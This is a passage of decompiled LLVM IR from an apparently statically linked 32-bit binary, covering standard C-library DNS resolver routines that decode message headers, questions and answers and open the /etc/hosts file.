  %v3_804d76a = add i32 %v2_804d76a, 6
  %v4_804d76a = inttoptr i32 %v3_804d76a to i8*
  store i8 %v3_804d766, i8* %v4_804d76a, align 1
  %v0_804d76d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d76d = add i32 %v0_804d76d, 36
  %v2_804d76d = inttoptr i32 %v1_804d76d to i32*
  %v3_804d76d = load i32, i32* %v2_804d76d, align 4
  %v1_804d770 = trunc i32 %v3_804d76d to i8
  %v2_804d770 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d770 = add i32 %v2_804d770, 7
  %v4_804d770 = inttoptr i32 %v3_804d770 to i8*
  store i8 %v1_804d770, i8* %v4_804d770, align 1
  %v0_804d773 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d773 = add i32 %v0_804d773, 41
  %v2_804d773 = inttoptr i32 %v1_804d773 to i8*
  %v3_804d773 = load i8, i8* %v2_804d773, align 1
  %v2_804d777 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d777 = add i32 %v2_804d777, 8
  %v4_804d777 = inttoptr i32 %v3_804d777 to i8*
  store i8 %v3_804d773, i8* %v4_804d777, align 1
  %v0_804d77a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d77a = add i32 %v0_804d77a, 40
  %v2_804d77a = inttoptr i32 %v1_804d77a to i32*
  %v3_804d77a = load i32, i32* %v2_804d77a, align 4
  %v1_804d77d = trunc i32 %v3_804d77a to i8
  %v2_804d77d = load i32, i32* %esi.global-to-local, align 4
  %v3_804d77d = add i32 %v2_804d77d, 9
  %v4_804d77d = inttoptr i32 %v3_804d77d to i8*
  store i8 %v1_804d77d, i8* %v4_804d77d, align 1
  %v0_804d780 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d780 = add i32 %v0_804d780, 45
  %v2_804d780 = inttoptr i32 %v1_804d780 to i8*
  %v3_804d780 = load i8, i8* %v2_804d780, align 1
  %v2_804d784 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d784 = add i32 %v2_804d784, 10
  %v4_804d784 = inttoptr i32 %v3_804d784 to i8*
  store i8 %v3_804d780, i8* %v4_804d784, align 1
  %v0_804d787 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d787 = add i32 %v0_804d787, 44
  %v2_804d787 = inttoptr i32 %v1_804d787 to i32*
  %v3_804d787 = load i32, i32* %v2_804d787, align 4
  %v1_804d78a = trunc i32 %v3_804d787 to i8
  %v2_804d78a = load i32, i32* %esi.global-to-local, align 4
  %v3_804d78a = add i32 %v2_804d78a, 11
  %v4_804d78a = inttoptr i32 %v3_804d78a to i8*
  store i8 %v1_804d78a, i8* %v4_804d78a, align 1
  %v2_804d792.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d792

dec_label_pc_804d792:                             ; preds = %entry, %dec_label_pc_804d6fc
  %v2_804d792 = phi i32 [ %v0_804d6e5, %entry ], [ %v2_804d792.pre, %dec_label_pc_804d6fc ]
  %v0_804d794 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_804d6fc ]
  store i32 %v2_804d792, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d794

; uselistorder directives
  uselistorder i32 41, { 1, 0 }
  uselistorder label %dec_label_pc_804d792, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d798 = load i32, i32* @ebx, align 4
  store i32 %v0_804d798, i32* %stack_var_-4, align 4
  %v4_804d799 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_804d799, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_804d7a1 = load i8, i8* %tmp2, align 1
  %v3_804d7a1 = zext i8 %v2_804d7a1 to i32
  %v1_804d7a4 = add i32 %v4_804d799, 1
  %v2_804d7a4 = inttoptr i32 %v1_804d7a4 to i8*
  %v3_804d7a4 = load i8, i8* %v2_804d7a4, align 1
  %v4_804d7a4 = zext i8 %v3_804d7a4 to i32
  %v2_804d7a8 = mul nuw nsw i32 %v3_804d7a1, 256
  %v2_804d7ab = or i32 %v4_804d7a4, %v2_804d7a8
  %v2_804d7ad = inttoptr i32 %tmp to i32*
  store i32 %v2_804d7ab, i32* %v2_804d7ad, align 4
  %v0_804d7af = load i32, i32* @ecx, align 4
  %v1_804d7af = add i32 %v0_804d7af, 2
  %v2_804d7af = inttoptr i32 %v1_804d7af to i8*
  %v3_804d7af = load i8, i8* %v2_804d7af, align 1
  %tmp6 = icmp slt i8 %v3_804d7af, 0
  %v2_804d7b3 = zext i1 %tmp6 to i32
  %v1_804d7b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7b6 = add i32 %v1_804d7b6, 4
  %v3_804d7b6 = inttoptr i32 %v2_804d7b6 to i32*
  store i32 %v2_804d7b3, i32* %v3_804d7b6, align 4
  %v0_804d7b9 = load i32, i32* @ecx, align 4
  %v1_804d7b9 = add i32 %v0_804d7b9, 2
  %v2_804d7b9 = inttoptr i32 %v1_804d7b9 to i8*
  %v3_804d7b9 = load i8, i8* %v2_804d7b9, align 1
  %v3_804d7bc = udiv i8 %v3_804d7b9, 8
  %tmp7 = urem i8 %v3_804d7bc, 16
  %v1_804d7bf = zext i8 %tmp7 to i32
  %v1_804d7c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7c2 = add i32 %v1_804d7c2, 8
  %v3_804d7c2 = inttoptr i32 %v2_804d7c2 to i32*
  store i32 %v1_804d7bf, i32* %v3_804d7c2, align 4
  %v0_804d7c5 = load i32, i32* @ecx, align 4
  %v1_804d7c5 = add i32 %v0_804d7c5, 2
  %v2_804d7c5 = inttoptr i32 %v1_804d7c5 to i8*
  %v3_804d7c5 = load i8, i8* %v2_804d7c5, align 1
  %div = udiv i8 %v3_804d7c5, 4
  %tmp8 = urem i8 %div, 2
  %v1_804d7cc = zext i8 %tmp8 to i32
  %v1_804d7cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7cf = add i32 %v1_804d7cf, 12
  %v3_804d7cf = inttoptr i32 %v2_804d7cf to i32*
  store i32 %v1_804d7cc, i32* %v3_804d7cf, align 4
  %v0_804d7d2 = load i32, i32* @ecx, align 4
  %v1_804d7d2 = add i32 %v0_804d7d2, 2
  %v2_804d7d2 = inttoptr i32 %v1_804d7d2 to i8*
  %v3_804d7d2 = load i8, i8* %v2_804d7d2, align 1
  %div5 = udiv i8 %v3_804d7d2, 2
  %tmp9 = urem i8 %div5, 2
  %v1_804d7d8 = zext i8 %tmp9 to i32
  %v1_804d7db = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7db = add i32 %v1_804d7db, 16
  %v3_804d7db = inttoptr i32 %v2_804d7db to i32*
  store i32 %v1_804d7d8, i32* %v3_804d7db, align 4
  %v0_804d7de = load i32, i32* @ecx, align 4
  %v1_804d7de = add i32 %v0_804d7de, 2
  %v2_804d7de = inttoptr i32 %v1_804d7de to i8*
  %v3_804d7de = load i8, i8* %v2_804d7de, align 1
  %tmp10 = urem i8 %v3_804d7de, 2
  %v1_804d7e2 = zext i8 %tmp10 to i32
  %v1_804d7e5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7e5 = add i32 %v1_804d7e5, 20
  %v3_804d7e5 = inttoptr i32 %v2_804d7e5 to i32*
  store i32 %v1_804d7e2, i32* %v3_804d7e5, align 4
  %v0_804d7e8 = load i32, i32* @ecx, align 4
  %v1_804d7e8 = add i32 %v0_804d7e8, 3
  %v2_804d7e8 = inttoptr i32 %v1_804d7e8 to i8*
  %v3_804d7e8 = load i8, i8* %v2_804d7e8, align 1
  %tmp11 = icmp slt i8 %v3_804d7e8, 0
  %v2_804d7ec = zext i1 %tmp11 to i32
  %v1_804d7ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7ef = add i32 %v1_804d7ef, 24
  %v3_804d7ef = inttoptr i32 %v2_804d7ef to i32*
  store i32 %v2_804d7ec, i32* %v3_804d7ef, align 4
  %v0_804d7f2 = load i32, i32* @ecx, align 4
  %v1_804d7f2 = add i32 %v0_804d7f2, 3
  %v2_804d7f2 = inttoptr i32 %v1_804d7f2 to i8*
  %v3_804d7f2 = load i8, i8* %v2_804d7f2, align 1
  %tmp12 = urem i8 %v3_804d7f2, 16
  %v1_804d7f6 = zext i8 %tmp12 to i32
  %v1_804d7f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7f9 = add i32 %v1_804d7f9, 28
  %v3_804d7f9 = inttoptr i32 %v2_804d7f9 to i32*
  store i32 %v1_804d7f6, i32* %v3_804d7f9, align 4
  %v0_804d7fc = load i32, i32* @ecx, align 4
  %v1_804d7fc = add i32 %v0_804d7fc, 4
  %v2_804d7fc = inttoptr i32 %v1_804d7fc to i8*
  %v3_804d7fc = load i8, i8* %v2_804d7fc, align 1
  %v4_804d7fc = zext i8 %v3_804d7fc to i32
  %v1_804d800 = add i32 %v0_804d7fc, 5
  %v2_804d800 = inttoptr i32 %v1_804d800 to i8*
  %v3_804d800 = load i8, i8* %v2_804d800, align 1
  %v4_804d800 = zext i8 %v3_804d800 to i32
  %v2_804d804 = mul nuw nsw i32 %v4_804d7fc, 256
  %v2_804d807 = or i32 %v4_804d800, %v2_804d804
  %v1_804d809 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d809 = add i32 %v1_804d809, 32
  %v3_804d809 = inttoptr i32 %v2_804d809 to i32*
  store i32 %v2_804d807, i32* %v3_804d809, align 4
  %v0_804d80c = load i32, i32* @ecx, align 4
  %v1_804d80c = add i32 %v0_804d80c, 6
  %v2_804d80c = inttoptr i32 %v1_804d80c to i8*
  %v3_804d80c = load i8, i8* %v2_804d80c, align 1
  %v4_804d80c = zext i8 %v3_804d80c to i32
  %v1_804d810 = add i32 %v0_804d80c, 7
  %v2_804d810 = inttoptr i32 %v1_804d810 to i8*
  %v3_804d810 = load i8, i8* %v2_804d810, align 1
  %v4_804d810 = zext i8 %v3_804d810 to i32
  %v2_804d814 = mul nuw nsw i32 %v4_804d80c, 256
  %v2_804d817 = or i32 %v4_804d810, %v2_804d814
  %v1_804d819 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d819 = add i32 %v1_804d819, 36
  %v3_804d819 = inttoptr i32 %v2_804d819 to i32*
  store i32 %v2_804d817, i32* %v3_804d819, align 4
  %v0_804d81c = load i32, i32* @ecx, align 4
  %v1_804d81c = add i32 %v0_804d81c, 8
  %v2_804d81c = inttoptr i32 %v1_804d81c to i8*
  %v3_804d81c = load i8, i8* %v2_804d81c, align 1
  %v4_804d81c = zext i8 %v3_804d81c to i32
  %v1_804d820 = add i32 %v0_804d81c, 9
  %v2_804d820 = inttoptr i32 %v1_804d820 to i8*
  %v3_804d820 = load i8, i8* %v2_804d820, align 1
  %v4_804d820 = zext i8 %v3_804d820 to i32
  %v2_804d824 = mul nuw nsw i32 %v4_804d81c, 256
  %v2_804d827 = or i32 %v4_804d820, %v2_804d824
  %v1_804d829 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d829 = add i32 %v1_804d829, 40
  %v3_804d829 = inttoptr i32 %v2_804d829 to i32*
  store i32 %v2_804d827, i32* %v3_804d829, align 4
  %v0_804d82c = load i32, i32* @ecx, align 4
  %v1_804d82c = add i32 %v0_804d82c, 10
  %v2_804d82c = inttoptr i32 %v1_804d82c to i8*
  %v3_804d82c = load i8, i8* %v2_804d82c, align 1
  %v4_804d82c = zext i8 %v3_804d82c to i32
  %v1_804d830 = add i32 %v0_804d82c, 11
  %v2_804d830 = inttoptr i32 %v1_804d830 to i8*
  %v3_804d830 = load i8, i8* %v2_804d830, align 1
  %v4_804d830 = zext i8 %v3_804d830 to i32
  %v2_804d834 = mul nuw nsw i32 %v4_804d82c, 256
  %v2_804d837 = or i32 %v4_804d830, %v2_804d834
  %v1_804d839 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d839 = add i32 %v1_804d839, 44
  %v3_804d839 = inttoptr i32 %v2_804d839 to i32*
  store i32 %v2_804d837, i32* %v3_804d839, align 4
  %v2_804d841 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d841, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804d844 = load i32, i32* @edi, align 4
  %v0_804d845 = load i32, i32* @esi, align 4
  %v0_804d846 = load i32, i32* @ebx, align 4
  store i32 %v0_804d846, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_804d853 = load i32, i32* @eax, align 4
  %v1_804d856 = inttoptr i32 %tmp3 to i32*
  %v2_804d856 = load i32, i32* %v1_804d856, align 4
  %v7_804d858 = inttoptr i32 %v2_804d856 to i8*
  %v8_804d858 = call i32 @__encode_dotted(i8* %v7_804d858, i32 %tmp2, i32 %tmp, i32 %v0_804d853, i32 %v0_804d846, i32 %v0_804d845, i32 %v0_804d844)
  store i32 %v8_804d858, i32* @ecx, align 4
  %v2_804d862 = icmp slt i32 %v8_804d858, 0
  br i1 %v2_804d862, label %dec_label_pc_804d891, label %dec_label_pc_804d866

dec_label_pc_804d866:                             ; preds = %entry
  %v0_804d866 = load i32, i32* @ebx, align 4
  %v2_804d866 = sub i32 %v0_804d866, %v8_804d858
  %v1_804d868 = add i32 %v2_804d866, -3
  %v6_804d868 = sub i32 2, %v2_804d866
  %v7_804d868 = and i32 %v6_804d868, %v2_804d866
  %v8_804d868 = icmp slt i32 %v7_804d868, 0
  %v9_804d868 = icmp eq i32 %v1_804d868, 0
  %v10_804d868 = icmp slt i32 %v1_804d868, 0
  %v3_804d86b = icmp eq i1 %v10_804d868, %v8_804d868
  %v4_804d86b = icmp eq i1 %v9_804d868, false
  %v5_804d86b = and i1 %v4_804d86b, %v3_804d86b
  br i1 %v5_804d86b, label %dec_label_pc_804d872, label %dec_label_pc_804d86d

dec_label_pc_804d86d:                             ; preds = %dec_label_pc_804d866
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_804d891

dec_label_pc_804d872:                             ; preds = %dec_label_pc_804d866
  %v0_804d872 = load i32, i32* @edi, align 4
  %v2_804d872 = add i32 %v0_804d872, %v8_804d858
  store i32 %v2_804d872, i32* @edx, align 4
  %v1_804d875 = add i32 %v8_804d858, 4
  store i32 %v1_804d875, i32* @ecx, align 4
  %v0_804d878 = load i32, i32* @esi, align 4
  %v1_804d878 = add i32 %v0_804d878, 5
  %v2_804d878 = inttoptr i32 %v1_804d878 to i8*
  %v3_804d878 = load i8, i8* %v2_804d878, align 1
  %v3_804d87c = inttoptr i32 %v2_804d872 to i8*
  store i8 %v3_804d878, i8* %v3_804d87c, align 1
  %v0_804d87e = load i32, i32* @esi, align 4
  %v1_804d87e = add i32 %v0_804d87e, 4
  %v2_804d87e = inttoptr i32 %v1_804d87e to i32*
  %v3_804d87e = load i32, i32* %v2_804d87e, align 4
  %v1_804d881 = trunc i32 %v3_804d87e to i8
  %v2_804d881 = load i32, i32* @edx, align 4
  %v3_804d881 = add i32 %v2_804d881, 1
  %v4_804d881 = inttoptr i32 %v3_804d881 to i8*
  store i8 %v1_804d881, i8* %v4_804d881, align 1
  %v0_804d884 = load i32, i32* @esi, align 4
  %v1_804d884 = add i32 %v0_804d884, 9
  %v2_804d884 = inttoptr i32 %v1_804d884 to i8*
  %v3_804d884 = load i8, i8* %v2_804d884, align 1
  %v2_804d888 = load i32, i32* @edx, align 4
  %v3_804d888 = add i32 %v2_804d888, 2
  %v4_804d888 = inttoptr i32 %v3_804d888 to i8*
  store i8 %v3_804d884, i8* %v4_804d888, align 1
  %v0_804d88b = load i32, i32* @esi, align 4
  %v1_804d88b = add i32 %v0_804d88b, 8
  %v2_804d88b = inttoptr i32 %v1_804d88b to i32*
  %v3_804d88b = load i32, i32* %v2_804d88b, align 4
  %v1_804d88e = trunc i32 %v3_804d88b to i8
  %v2_804d88e = load i32, i32* @edx, align 4
  %v3_804d88e = add i32 %v2_804d88e, 3
  %v4_804d88e = inttoptr i32 %v3_804d88e to i8*
  store i8 %v1_804d88e, i8* %v4_804d88e, align 1
  %v0_804d891.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d891

dec_label_pc_804d891:                             ; preds = %entry, %dec_label_pc_804d86d, %dec_label_pc_804d872
  %v0_804d891 = phi i32 [ %v8_804d858, %entry ], [ -1, %dec_label_pc_804d86d ], [ %v0_804d891.pre, %dec_label_pc_804d872 ]
  %v2_804d893 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d893, i32* @ebx, align 4
  store i32 %v0_804d844, i32* @edi, align 4
  ret i32 %v0_804d891

; uselistorder directives
  uselistorder i32 %v1_804d868, { 1, 0 }
  uselistorder i32 %v2_804d866, { 0, 2, 1 }
  uselistorder i32 %v8_804d858, { 1, 2, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_804d891, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_804d8a3 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_804d8ab = icmp slt i32 %v2_804d8a3, 0
  br i1 %v2_804d8ab, label %dec_label_pc_804d8b2, label %dec_label_pc_804d8af

dec_label_pc_804d8af:                             ; preds = %entry
  %v1_804d8af = add i32 %v2_804d8a3, 4
  br label %dec_label_pc_804d8b2

dec_label_pc_804d8b2:                             ; preds = %entry, %dec_label_pc_804d8af
  %v0_804d8b5 = phi i32 [ %v2_804d8a3, %entry ], [ %v1_804d8af, %dec_label_pc_804d8af ]
  ret i32 %v0_804d8b5

; uselistorder directives
  uselistorder label %dec_label_pc_804d8b2, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d8b8 = load i32, i32* @ebp, align 4
  %v0_804d8b9 = load i32, i32* @edi, align 4
  %v0_804d8ba = load i32, i32* @esi, align 4
  %v0_804d8bb = load i32, i32* @ebx, align 4
  store i32 %v0_804d8bb, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_804d8dc = ptrtoint i32* %stack_var_-272 to i32
  %v4_804d8e9 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_804d8dc, i32 256)
  store i32 %v4_804d8e9, i32* @edi, align 4
  %v3_804d8f3 = icmp slt i32 %v4_804d8e9, 0
  br i1 %v3_804d8f3, label %dec_label_pc_804d9a4, label %dec_label_pc_804d8fb

dec_label_pc_804d8fb:                             ; preds = %entry
  %v0_804d8fb = load i32, i32* @ebx, align 4
  %v3_804d8fb = add i32 %v0_804d8fb, %v4_804d8e9
  %v0_804d8fd = load i32, i32* @esi, align 4
  %v2_804d8fd = sub i32 %v0_804d8fd, %v3_804d8fb
  %v1_804d903 = add i32 %v2_804d8fd, -10
  %v10_804d903 = icmp slt i32 %v1_804d903, 0
  store i32 %v1_804d903, i32* @esi, align 4
  %v1_804d90a = icmp eq i1 %v10_804d903, false
  br i1 %v1_804d90a, label %dec_label_pc_804d913, label %dec_label_pc_804d90c

dec_label_pc_804d90c:                             ; preds = %dec_label_pc_804d8fb
  br label %dec_label_pc_804d9a4

dec_label_pc_804d913:                             ; preds = %dec_label_pc_804d8fb
  %v6_804d91a = add i32 %v3_804d8fb, %tmp4
  store i32 %v6_804d91a, i32* @ebx, align 4
  %v1_804d926 = bitcast i32* %stack_var_-272 to i8*
  %v2_804d926 = call i32 @__GI_strdup(i8* %v1_804d926)
  %v1_804d92b = load i32, i32* @ebp, align 4
  %v2_804d92b = inttoptr i32 %v1_804d92b to i32*
  store i32 %v2_804d926, i32* %v2_804d92b, align 4
  %v0_804d92e = load i32, i32* @ebx, align 4
  %v1_804d92e = add i32 %v0_804d92e, 4
  store i32 %v1_804d92e, i32* %esi.global-to-local, align 4
  %v1_804d931 = inttoptr i32 %v0_804d92e to i8*
  %v2_804d931 = load i8, i8* %v1_804d931, align 1
  %v3_804d931 = zext i8 %v2_804d931 to i32
  %v1_804d934 = add i32 %v0_804d92e, 1
  %v2_804d934 = inttoptr i32 %v1_804d934 to i8*
  %v3_804d934 = load i8, i8* %v2_804d934, align 1
  %v4_804d934 = zext i8 %v3_804d934 to i32
  %v2_804d938 = mul nuw nsw i32 %v3_804d931, 256
  %v2_804d93b = or i32 %v4_804d934, %v2_804d938
  %v1_804d93d = load i32, i32* @ebp, align 4
  %v2_804d93d = add i32 %v1_804d93d, 4
  %v3_804d93d = inttoptr i32 %v2_804d93d to i32*
  store i32 %v2_804d93b, i32* %v3_804d93d, align 4
  %v0_804d940 = load i32, i32* @ebx, align 4
  %v1_804d940 = add i32 %v0_804d940, 2
  %v2_804d940 = inttoptr i32 %v1_804d940 to i8*
  %v3_804d940 = load i8, i8* %v2_804d940, align 1
  %v4_804d940 = zext i8 %v3_804d940 to i32
  %v1_804d944 = add i32 %v0_804d940, 3
  %v2_804d944 = inttoptr i32 %v1_804d944 to i8*
  %v3_804d944 = load i8, i8* %v2_804d944, align 1
  %v4_804d944 = zext i8 %v3_804d944 to i32
  %v2_804d948 = mul nuw nsw i32 %v4_804d940, 256
  %v2_804d94b = or i32 %v4_804d944, %v2_804d948
  %v1_804d94d = load i32, i32* @ebp, align 4
  %v2_804d94d = add i32 %v1_804d94d, 8
  %v3_804d94d = inttoptr i32 %v2_804d94d to i32*
  store i32 %v2_804d94b, i32* %v3_804d94d, align 4
  %v0_804d950 = load i32, i32* @ebx, align 4
  %v1_804d950 = add i32 %v0_804d950, 4
  %v2_804d950 = inttoptr i32 %v1_804d950 to i8*
  %v3_804d950 = load i8, i8* %v2_804d950, align 1
  %v4_804d950 = zext i8 %v3_804d950 to i32
  %v0_804d954 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d954 = add i32 %v0_804d954, 1
  %v2_804d954 = inttoptr i32 %v1_804d954 to i8*
  %v3_804d954 = load i8, i8* %v2_804d954, align 1
  %v4_804d954 = zext i8 %v3_804d954 to i32
  %v2_804d958 = mul nuw i32 %v4_804d950, 16777216
  %v2_804d95b = mul nuw nsw i32 %v4_804d954, 65536
  %v1_804d95e = add i32 %v0_804d954, 2
  %v2_804d95e = inttoptr i32 %v1_804d95e to i8*
  %v3_804d95e = load i8, i8* %v2_804d95e, align 1
  %v4_804d95e = zext i8 %v3_804d95e to i32
  %v2_804d962 = mul nuw nsw i32 %v4_804d95e, 256
  %v2_804d965 = or i32 %v2_804d95b, %v2_804d958
  %v1_804d967 = add i32 %v0_804d954, 3
  %v2_804d967 = inttoptr i32 %v1_804d967 to i8*
  %v3_804d967 = load i8, i8* %v2_804d967, align 1
  %v4_804d967 = zext i8 %v3_804d967 to i32
  %v2_804d96b = or i32 %v4_804d967, %v2_804d965
  %v2_804d96d = or i32 %v2_804d96b, %v2_804d962
  store i32 %v2_804d96d, i32* @ecx, align 4
  %v1_804d96f = load i32, i32* @ebp, align 4
  %v2_804d96f = add i32 %v1_804d96f, 12
  %v3_804d96f = inttoptr i32 %v2_804d96f to i32*
  store i32 %v2_804d96d, i32* %v3_804d96f, align 4
  %v0_804d972 = load i32, i32* @ebx, align 4
  %v1_804d972 = add i32 %v0_804d972, 8
  %v2_804d972 = inttoptr i32 %v1_804d972 to i8*
  %v3_804d972 = load i8, i8* %v2_804d972, align 1
  %v4_804d972 = zext i8 %v3_804d972 to i32
  %v1_804d976 = add i32 %v0_804d972, 9
  %v2_804d976 = inttoptr i32 %v1_804d976 to i8*
  %v3_804d976 = load i8, i8* %v2_804d976, align 1
  %v4_804d976 = zext i8 %v3_804d976 to i32
  %v2_804d97a = mul nuw nsw i32 %v4_804d972, 256
  %v1_804d97d = add i32 %v0_804d972, 10
  %v2_804d980 = or i32 %v4_804d976, %v2_804d97a
  store i32 %v2_804d980, i32* @edx, align 4
  %v1_804d982 = load i32, i32* @ebp, align 4
  %v2_804d982 = add i32 %v1_804d982, 20
  %v3_804d982 = inttoptr i32 %v2_804d982 to i32*
  store i32 %v1_804d97d, i32* %v3_804d982, align 4
  %v0_804d985 = load i32, i32* @edx, align 4
  %v1_804d985 = load i32, i32* @ebp, align 4
  %v2_804d985 = add i32 %v1_804d985, 16
  %v3_804d985 = inttoptr i32 %v2_804d985 to i32*
  store i32 %v0_804d985, i32* %v3_804d985, align 4
  %v1_804d98f = add i32 %v3_804d8fb, 10
  %v1_804d992 = load i32, i32* @ebp, align 4
  %v2_804d992 = add i32 %v1_804d992, 24
  %v3_804d992 = inttoptr i32 %v2_804d992 to i32*
  store i32 %v1_804d98f, i32* %v3_804d992, align 4
  %v4_804d995 = load i32, i32* @edx, align 4
  %v5_804d999 = icmp slt i32 %v1_804d903, %v4_804d995
  br i1 %v5_804d999, label %dec_label_pc_804d99b, label %dec_label_pc_804d9a0

dec_label_pc_804d99b:                             ; preds = %dec_label_pc_804d913
  br label %dec_label_pc_804d9a4

dec_label_pc_804d9a0:                             ; preds = %dec_label_pc_804d913
  %v1_804d9a0 = load i32, i32* @edi, align 4
  %v2_804d9a0 = add i32 %v4_804d995, 10
  %v3_804d9a0 = add i32 %v2_804d9a0, %v1_804d9a0
  br label %dec_label_pc_804d9a4

dec_label_pc_804d9a4:                             ; preds = %entry, %dec_label_pc_804d99b, %dec_label_pc_804d90c, %dec_label_pc_804d9a0
  %v0_804d9aa = phi i32 [ %v4_804d8e9, %entry ], [ -1, %dec_label_pc_804d99b ], [ %v1_804d903, %dec_label_pc_804d90c ], [ %v3_804d9a0, %dec_label_pc_804d9a0 ]
  %v2_804d9ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d9ac, i32* @ebx, align 4
  store i32 %v0_804d8ba, i32* @esi, align 4
  store i32 %v0_804d8b9, i32* @edi, align 4
  store i32 %v0_804d8b8, i32* @ebp, align 4
  ret i32 %v0_804d9aa

; uselistorder directives
  uselistorder i32 %v1_804d903, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804d8fb, { 1, 0, 2 }
  uselistorder i32 %v4_804d8e9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804d9a4, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_804d9c1 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805064d.110 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v3_804d9c1, i32* @eax, align 4
  %v1_804d9c9 = icmp eq i32 %v3_804d9c1, 0
  %v1_804d9cb = icmp eq i1 %v1_804d9c9, false
  br i1 %v1_804d9cb, label %dec_label_pc_804d9e1, label %dec_label_pc_804d9cd

dec_label_pc_804d9cd:                             ; preds = %entry
  %v3_804d9d9 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8050658.111 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  br label %dec_label_pc_804d9e1

dec_label_pc_804d9e1:                             ; preds = %entry, %dec_label_pc_804d9cd
  %v0_804d9e4 = phi i32 [ %v3_804d9c1, %entry ], [ %v3_804d9d9, %dec_label_pc_804d9cd ]
  ret i32 %v0_804d9e4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80505fe.89 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_804d9e1, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_804d9e5 = load i32, i32* @ebp, align 4
  %v0_804d9e6 = load i32, i32* @edi, align 4
  %v0_804d9e7 = load i32, i32* @esi, align 4
  %v0_804d9e8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_804d9f6 = sub i32 0, %arg6
  %v1_804d9f8 = urem i32 %v1_804d9f6, 4
  %v2_804d9f8 = icmp eq i32 %v1_804d9f8, 0
  store i32 %v1_804d9f8, i32* %eax.global-to-local, align 4
  br i1 %v2_804d9f8, label %dec_label_pc_804da09, label %dec_label_pc_804d9fd

dec_label_pc_804d9fd:                             ; preds = %entry
  %v2_804d9fd = sub i32 %arg7, %v1_804d9f8
  %v7_804d9fd = icmp ugt i32 %v1_804d9f8, %arg7
  br i1 %v7_804d9fd, label %dec_label_pc_804dcad, label %dec_label_pc_804da05

dec_label_pc_804da05:                             ; preds = %dec_label_pc_804d9fd
  %v2_804da05 = add i32 %v1_804d9f8, %arg6
  store i32 %v2_804da05, i32* @ebx, align 4
  store i32 %v2_804d9fd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804da09

dec_label_pc_804da09:                             ; preds = %entry, %dec_label_pc_804da05
